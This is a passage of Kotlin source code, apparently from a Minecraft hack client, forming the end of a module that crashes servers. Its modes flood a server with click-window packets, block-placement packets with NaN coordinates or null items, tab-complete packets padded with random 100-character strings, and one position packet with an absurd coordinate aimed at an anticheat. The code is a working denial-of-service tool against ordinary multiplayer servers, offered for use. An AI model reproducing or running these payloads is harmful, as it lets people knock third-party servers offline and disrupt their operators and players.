                repeat(packetAmountValue.get()) {
                    PacketUtils.sendPacketNoEvent(C0EPacketClickWindow(0, RandomUtils.nextInt(1, 35), 1, 4, mc.thePlayer.inventory.getCurrentItem(), 0))
                }
                mc.netHandler.addToSendQueue(C0DPacketCloseWindow())
            }

            "c08" -> {
                repeat(packetAmountValue.get()) {
                    PacketUtils.sendPacketNoEvent(C08PacketPlayerBlockPlacement(mc.thePlayer.currentEquippedItem))
                }
            }

            "nullc08" -> {
                repeat(packetAmountValue.get()) {
                    PacketUtils.sendPacketNoEvent(C08PacketPlayerBlockPlacement(BlockPos(Double.NaN, Double.NaN, Double.NaN), 1, null, 0f, 0f, 0f))
                }
            }

            "commandcomplete" -> {
                repeat(packetAmountValue.get()) {
                    PacketUtils.sendPacketNoEvent(C14PacketTabComplete("/${RandomUtils.randomString(100)}"))
                }
            }

            "aacv5" -> {
                PacketUtils.sendPacketNoEvent(C03PacketPlayer.C04PacketPlayerPosition(1.7e+301, -999.0, 0.0, true))
            }

            else -> state = false // Disable module when mode is just a one run crasher
        }
    }

    @EventTarget
    fun onPacket(event: PacketEvent) {
        val packet = event.packet

        when (modeValue.get().lowercase()) {
            "inventory" -> {
                if(packet is S2DPacketOpenWindow) {
                    nowInv = packet.windowId
                    if (slientInventoryValue.get()) {
                        chat("Inventory opened, sending packets...")
                        event.cancelEvent()
                    }
                } else if (packet is S2EPacketCloseWindow || packet is C0DPacketCloseWindow) {
                    nowInv = -1
                    invSlots.clear()
                } else if (packet is S2FPacketSetSlot) {
                    if (packet.func_149175_c() == nowInv && packet.func_149174_e() != null && !invSlots.containsKey(packet.func_149173_d())) {
                        invSlots.put(packet.func_149173_d(), packet.func_149174_e())
                    }
                }
            }
        }
    }

    @EventTarget
    fun onWorld(event: WorldEvent) {
        if (event.worldClient == null) {
            mc.timer.timerSpeed = 1.00f
            state = false // Disable module in case you left the server
        }
    }

    override fun onDisable() {
        mc.timer.timerSpeed = 1f
    }

    @EventTarget
    fun onTick(event: TickEvent) {
        if (mc.thePlayer == null || mc.theWorld == null) {
            mc.timer.timerSpeed = 1.00f
            state = false // Disable module in case you left the server
        }
    }

    override val tag: String
        get() = modeValue.get()
}
